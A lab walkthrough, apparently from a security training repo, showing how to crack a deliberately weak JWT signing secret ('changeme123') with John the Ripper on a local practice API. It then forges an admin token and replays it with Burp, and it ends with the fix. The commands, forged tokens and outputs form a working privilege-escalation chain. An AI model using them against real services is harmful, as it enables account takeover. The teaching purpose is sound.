# Walkthrough — jwt-weak-secret

You are going to take a legitimate JWT — a real HS256 signature, verified correctly by the server — and **crack the secret that signs it**, because the developer chose a dictionary word. With the secret in hand you forge a `role: admin` token the server accepts as genuine: not because signature verification is broken (it works), but because you now hold the key. The lock locks; the key was on a sticky note.

This is the sibling of [`jwt-none-alg`](../jwt-none-alg/). There the lock didn't lock — the server accepted `alg:none` and skipped verification. Here verification runs, correctly, and you defeat it by *re-making* a valid signature with the stolen key.

## 1. Context

A small API with JWT auth. Three endpoints:

- `POST /login` — returns a JWT signed with HS256, carrying `{"sub": "alice", "role": "user"}`. No password.
- `GET /api/profile` — any valid token; echoes your claims. Your baseline, and where you grab the JWT.
- `GET /admin/users` — requires `role: admin`. Your `user` token gets `403`; a forged `admin` token gets `200`.

The server verifies every token under `algorithms=["HS256"]` — a tampered signature is `401`, and `alg:none` (the `jwt-none-alg` trick) is `401` too. This atom is **A02 — Cryptographic Failures**: the signature scheme is sound and correctly checked; the one weakness is the *value* of the signing secret.

The track is **Burp** (capture the token, replay the forgery) plus a **terminal** (crack the secret with John the Ripper, forge the new token). There is no browser: cracking a secret is something Burp can't do, so — exactly as a browser executes JavaScript for a client-side bug — the tool that does that part of the job joins the primary track. The tokens below are from one real session; because these claims carry no timestamps, the HS256 token is deterministic — log in as `alice` and you get the same bytes.

## 2. Spot the bug

Open [`vulnerable/app.py`](./vulnerable/app.py). The decode helper is textbook-correct:

```python
def decode(token):
    return jwt.decode(token, SECRET, algorithms=["HS256"])
```

This is the *fixed* form from `jwt-none-alg`: a positive `algorithms=["HS256"]` allowlist, no branch on the header, no `alg:none` escape hatch. The algorithm handling is right. The bug is not on this line.

Now look one line up, at the constant it verifies with:

```python
SECRET = "changeme123"  # VULNERABLE: weak, guessable, sits in any password wordlist
```

That's the whole vulnerability. The audit question isn't "does it verify?" — it does. It's **"is this secret strong?"** — and `changeme123` is a dictionary word. The security of every token rests on a value an attacker can guess. Hold that thought for the diff: the fix won't touch a line of logic, it will change this one constant.

PyJWT even warns you. Because `changeme123` is 11 bytes, every sign and verify prints `InsecureKeyLengthWarning: The HMAC key is 11 bytes long, which is below the minimum recommended length of 32 bytes for SHA256` to the server log. The library is telling you the key is too weak — it just doesn't refuse.

## 3. How the JWT is signed

A JWT is three base64url segments: `header.payload.signature`. The signature is `HMAC-SHA256(header + "." + payload, SECRET)` — a keyed hash over the first two segments. The server recomputes that HMAC with its `SECRET` and rejects the token if it doesn't match. (For a full byte-by-byte anatomy, see `jwt-none-alg`'s walkthrough §2.)

Two consequences:

- To **forge** a token the server will accept, you must know `SECRET`. There is no way around the HMAC — it is sound.
- But HMAC-SHA256 over a *guessable* key is a brute-force target: for each candidate word, recompute the HMAC and check it against the captured signature. That is exactly what a cracker does.

`alg:none` is not an option here — the server pins `algorithms=["HS256"]`, so an unsigned token is rejected (you'll confirm this in §9). The only way in is the key.

## 4. Baseline — the API working (Repeater)

Point Burp at `127.0.0.1:8013` and work from Repeater. Log in as alice:

```
POST /login HTTP/1.1
Host: 127.0.0.1:8013
Content-Type: application/json

{"user": "alice"}
```

Response — `200`, your token:

```json
{"token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhbGljZSIsInJvbGUiOiJ1c2VyIn0.6BhkpiQ83X2YaEIV4WJsi1f1OyBlnHulxD3BchcVmSQ"}
```

Confirm it works:

```
GET /api/profile HTTP/1.1
Host: 127.0.0.1:8013
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhbGljZSIsInJvbGUiOiJ1c2VyIn0.6BhkpiQ83X2YaEIV4WJsi1f1OyBlnHulxD3BchcVmSQ
```

Response — `200`: `{"role":"user","sub":"alice"}`. Now try the admin endpoint with the same token:

```
GET /admin/users HTTP/1.1
Host: 127.0.0.1:8013
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhbGljZSIsInJvbGUiOiJ1c2VyIn0.6BhkpiQ83X2YaEIV4WJsi1f1OyBlnHulxD3BchcVmSQ
```

Response — `403`. You are authenticated, but `role` is `user`. That is the legitimate baseline: the role gate works.

## 5. Step 1 — Capture the JWT

You already have it — it is the token from the `/login` response body, and it rides on every `/api/profile` request in the `Authorization` header. Copy it out (in Burp, select the header value, or grab it from the login response). This one token is what you'll crack.

Decoded (base64url — anyone with the token can read it), the header and payload are:

```
header  {"alg":"HS256","typ":"JWT"}
payload {"sub":"alice","role":"user"}
```

The third segment is the HMAC signature. You cannot read the key out of it — but you can guess the key and check.

## 6. Step 2 — Crack the signing secret (terminal)

This step is outside Burp and outside the container — a cracker on your own terminal. Save the captured token to a file:

```bash
echo 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhbGljZSIsInJvbGUiOiJ1c2VyIn0.6BhkpiQ83X2YaEIV4WJsi1f1OyBlnHulxD3BchcVmSQ' > jwt.txt
```

Run John the Ripper against the wordlist that ships with this atom. Jumbo john recognizes a raw JWT and loads it under its `HMAC-SHA256` format automatically:

```bash
john --wordlist=wordlist-sample.txt jwt.txt
```

> You need John the Ripper **jumbo** (the community build at [openwall/john](https://github.com/openwall/john), shipped by Kali and most pentest distros). The core build has no `HMAC-SHA256` format and won't load a JWT.

Real output:

```
Using default input encoding: UTF-8
Loaded 1 password hash (HMAC-SHA256 [password is key, SHA256 256/256 AVX2 8x])
Will run 12 OpenMP threads
Press Ctrl-C to abort, or send SIGUSR1 to john process for status
changeme123      (?)
1g 0:00:00:00 DONE (2026-07-17 18:59) 100.0g/s 100000p/s 100000c/s 100000C/s 123456..panda
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

`john --show jwt.txt` confirms it:

```
?:changeme123

1 password hash cracked, 0 left
```

The secret is `changeme123`. (Thread count, timestamp and rate depend on your machine.) Against this ~1000-word sample list john finishes in well under a second — the secret sits near the end, around line 980, so it works through the common guesses first. In a real engagement you'd point john at the canonical big list, **rockyou** — on Kali at `/usr/share/wordlists/rockyou.txt` (gzipped), or bundled with John the Ripper's own distribution — where you'd watch the status line grind through millions of candidates. `changeme123` is in rockyou too (line 361,429), so the same run cracks it there; the sample list is just zero-friction for the lab. (Don't `wget` a random rockyou mirror — use the copy your distro ships.)

## 7. Step 3 — Forge an admin token

With the secret, you re-make a signature yourself — a genuine one. A one-liner with the same JWT library the app uses:

```bash
python3 -c "import jwt; print(jwt.encode({'sub': 'alice', 'role': 'admin'}, 'changeme123', algorithm='HS256'))"
```

Output — a valid admin token:

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhbGljZSIsInJvbGUiOiJhZG1pbiJ9.BalXD3EsGbrToDQm5zMCKrIABJPI52WYVtsRXmO-YNU
```

This is the inverse of `jwt-none-alg`. There you *stripped* the signature (`alg:none`, empty third segment). Here you *produce* a real HMAC signature with the stolen key — mathematically identical to one the server would issue, because it uses the same key. Decoded, the payload now reads `{"sub":"alice","role":"admin"}`.

## 8. Step 4 — Replay the forged token (Burp)

Back in Repeater, send the forged token to the admin endpoint:

```
GET /admin/users HTTP/1.1
Host: 127.0.0.1:8013
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhbGljZSIsInJvbGUiOiJhZG1pbiJ9.BalXD3EsGbrToDQm5zMCKrIABJPI52WYVtsRXmO-YNU
```

Response — `200`, the admin-only data:

```json
[{"role":"user","user":"alice"},{"role":"user","user":"bob"},{"role":"admin","user":"carol"}]
```

Vertical escalation confirmed. You did not bypass the signature check — you **satisfied** it, with the key you cracked. The server cannot tell your forgery from a token it issued itself, because they are the same thing: bytes signed with `changeme123`.

## 9. What the vuln is NOT

The exploit can push you toward the wrong conclusion. Kill three of them — all from Repeater.

**It is not a verification failure.** Take the forged admin token and flip one character of its signature, or sign with the wrong key:

```bash
python3 -c "import jwt; print(jwt.encode({'sub':'alice','role':'admin'}, 'wrongkey', algorithm='HS256'))"
```

Send that → **`401`**. The server checks the HMAC and rejects anything not signed with the real secret. Verification works perfectly; only a signature made with the *correct* key passes.

**It is not `alg:none` — this is not `jwt-none-alg`.** Build the classic unsigned forgery and send it:

```
Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhbGljZSIsInJvbGUiOiJhZG1pbiJ9.
```

Response — **`401`**. The `algorithms=["HS256"]` allowlist rejects it; that bug is closed here. (No token, or a random Bearer, is `401` too.)

**It is not the algorithm.** HMAC-SHA256 was not broken — it did its job. You didn't break the math; you *guessed the key*.

One root cause under all three: the secret had no entropy. Only the token signed with the cracked-but-correct key gets through.

That is the `jwt-none-alg` pairing, made concrete:

| | `jwt-none-alg` (the sibling) | `jwt-weak-secret` (here) |
|---|---|---|
| The lock | didn't lock (`alg:none`, verification skipped) | locks, correctly (`algorithms=["HS256"]`) |
| The attack on the signature | you **strip** it off | you **re-make** it, genuine, with the cracked key |
| Where the flaw lives | the code (a header-driven branch) | a value (the `SECRET` constant) |

`jwt-none-alg` said *"looks-like-crypto is not is-crypto."* This atom sharpens it: crypto that really runs still isn't a boundary if the key is guessable. **Signed is not secure — a signature is only as strong as its secret.**

## 10. Impact

Vertical privilege escalation. With the secret you can forge **any** token — any `sub`, any `role`, any claim the app trusts. You didn't just read another same-level user's data (that is the horizontal escalation the IDOR/BOLA atoms teach); you *became an administrator*, and could become anyone with any privilege. In effect you own the app's authentication: you are whoever you say you are. **It is not RCE** — no code execution — but for an auth system it is close to total: every identity and role decision downstream of this token now bends to you.

## 11. Why the fix works

Run the chain against the fixed API on port **8113** (see [`DIFF.md`](./DIFF.md)). It is byte-identical except for the `SECRET` constant, now a 43-character CSPRNG value:

- **Log in on 8113 and crack that token** with the same `john --wordlist=wordlist-sample.txt jwt.txt` → **no hit** (`0 password hashes cracked, 1 left`). The strong secret is not in the sample list — or in rockyou, or any wordlist: brute-forcing 32 random bytes is infeasible.
- **Replay the admin token you forged against the vulnerable app** (signed with `changeme123`) → **`401`**. The signature no longer matches, because the fixed app verifies with a different key.
- Everything else is unchanged — same endpoints, same `algorithms=["HS256"]`; `alg:none` and no-token still `401`, and a legitimate `user` token still `403` on `/admin/users`.

The fix was not a line of logic. It was `SECRET = "changeme123"` → `SECRET = "<43 CSPRNG chars>"`. The security lived entirely in the value of the secret. See [`DIFF.md`](./DIFF.md) for why that makes this the repo's first fix that changes a *value*, not code.
